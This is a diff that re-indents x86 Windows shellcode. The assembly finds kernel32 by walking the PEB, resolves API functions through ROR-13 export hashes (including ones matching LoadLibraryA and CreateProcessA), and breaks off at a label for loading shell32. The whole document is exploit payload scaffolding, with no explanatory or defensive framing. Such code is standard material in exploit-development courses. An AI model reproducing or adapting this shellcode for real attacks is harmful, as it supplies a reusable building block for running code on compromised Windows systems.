@@ -1,91 +1,91 @@
 start: 
-mov ebp, esp ;
-add esp, 0xfffffcf0 ;
+  mov ebp, esp ;
+  add esp, 0xfffffcf0 ;
 
 find_kernel32:
-xor ecx, ecx ;
-mov esi,fs:[ecx+30h] ;
-mov esi,[esi+0Ch] ;
-mov esi,[esi+1Ch] ;
+  xor ecx, ecx ;
+  mov esi,fs:[ecx+30h] ;
+  mov esi,[esi+0Ch] ;
+  mov esi,[esi+1Ch] ;
 
 next_module:
-mov ebx, [esi+8h] ;
-mov edi, [esi+20h] ;
-mov esi, [esi] ;
-cmp [edi+12*2], cx ;
-jne next_module ;
+  mov ebx, [esi+8h] ;
+  mov edi, [esi+20h] ;
+  mov esi, [esi] ;
+  cmp [edi+12*2], cx ;
+  jne next_module ;
 
 find_function_shorten:
-jmp find_function_shorten_bnc ;
+  jmp find_function_shorten_bnc ;
 
 find_function_ret:
-pop esi ;
-mov [ebp+0x04], esi ;
-jmp resolve_symbols_kernel32 ;
+  pop esi ;
+  mov [ebp+0x04], esi ;
+  jmp resolve_symbols_kernel32 ;
 
 find_function_shorten_bnc:
-call find_function_ret ;
+  call find_function_ret ;
 
 find_function:
-pushad ;
-mov eax, [ebx+0x3c] ;
-mov edi, [ebx+eax+0x78] ;
-add edi, ebx ;
-mov ecx, [edi+0x18] ;
-mov eax, [edi+0x20] ;
-add eax, ebx ;
-mov [ebp-4], eax ;
+  pushad ;
+  mov eax, [ebx+0x3c] ;
+  mov edi, [ebx+eax+0x78] ;
+  add edi, ebx ;
+  mov ecx, [edi+0x18] ;
+  mov eax, [edi+0x20] ;
+  add eax, ebx ;
+  mov [ebp-4], eax ;
 
 find_function_loop: 
-jecxz find_function_finished ;
-dec ecx ;
-mov eax, [ebp-4] ;
-mov esi, [eax+ecx*4] ;
-add esi, ebx ;
+  jecxz find_function_finished ;
+  dec ecx ;
+  mov eax, [ebp-4] ;
+  mov esi, [eax+ecx*4] ;
+  add esi, ebx ;
 compute_hash: 
- xor eax, eax ;
- cdq ;
- cld ;
+  xor eax, eax ;
+  cdq ;
+  cld ;
 
 compute_hash_again: 
-lodsb ;
-test al, al ;
-jz compute_hash_finished ;
-ror edx, 0x0d ;
-add edx, eax ;
-jmp compute_hash_again ;
+  lodsb ;
+  test al, al ;
+  jz compute_hash_finished ;
+  ror edx, 0x0d ;
+  add edx, eax ;
+  jmp compute_hash_again ;
 
 compute_hash_finished: 
 
 find_function_compare: 
-cmp edx, [esp+0x24] ;
-jnz find_function_loop ;
-mov edx, [edi+0x24] ;
-add edx, ebx ;
-mov cx, [edx+2*ecx] ;
-mov edx, [edi+0x1c] ;
-add edx, ebx ;
-mov eax, [edx+4*ecx] ;
-add eax, ebx ;
-mov [esp+0x1c], eax ;
+  cmp edx, [esp+0x24] ;
+  jnz find_function_loop ;
+  mov edx, [edi+0x24] ;
+  add edx, ebx ;
+  mov cx, [edx+2*ecx] ;
+  mov edx, [edi+0x1c] ;
+  add edx, ebx ;
+  mov eax, [edx+4*ecx] ;
+  add eax, ebx ;
+  mov [esp+0x1c], eax ;
 
 find_function_finished: 
-popad ;
-ret ;
+  popad ;
+  ret ;
 
 resolve_symbols_kernel32: 
-push 0x78b5b983 ;
-call dword ptr [ebp+0x04] ;
-mov [ebp+0x14], eax ;
-push 0x75da1966 ;
-call dword ptr [ebp+0x04] ;
-mov [ebp+0x18], eax ;
-push 0x16b3fe72 ;
-call dword ptr [ebp+0x04] ;
-mov [ebp+0x1C], eax ;
-push 0xec0e4e8e ;
-call dword ptr [ebp+0x04] ;
-mov [ebp+0x20], eax ;
+  push 0x78b5b983 ;
+  call dword ptr [ebp+0x04] ;
+  mov [ebp+0x14], eax ;
+  push 0x75da1966 ;
+  call dword ptr [ebp+0x04] ;
+  mov [ebp+0x18], eax ;
+  push 0x16b3fe72 ;
+  call dword ptr [ebp+0x04] ;
+  mov [ebp+0x1C], eax ;
+  push 0xec0e4e8e ;
+  call dword ptr [ebp+0x04] ;
+  mov [ebp+0x20], eax ;
 
 load_shell32: 
   xor eax, eax ;
